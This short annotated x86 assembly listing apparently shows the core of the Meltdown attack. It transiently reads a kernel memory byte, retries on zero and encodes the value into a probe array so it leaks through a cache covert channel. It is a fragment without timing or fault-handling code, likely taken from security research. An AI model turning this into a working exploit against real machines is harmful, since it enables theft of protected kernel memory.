
				  1 ; rcx = kernel address, rbx = probe array
				  2 xor rax, rax                # set rax to 0
				  3 retry:
				  4 mov al, byte [rcx]          # attempt to read kernel memory
				  5 shl rax, 0xc                # multiply result by page size (4KB)
				  6 jz retry                    # if the result is zero, try again
				  7 mov rbx, qword [rbx + rax]  # transmit result over a cache covert channel
				

				